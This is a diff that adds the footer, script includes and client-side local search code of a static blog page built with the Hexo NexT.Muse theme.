+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
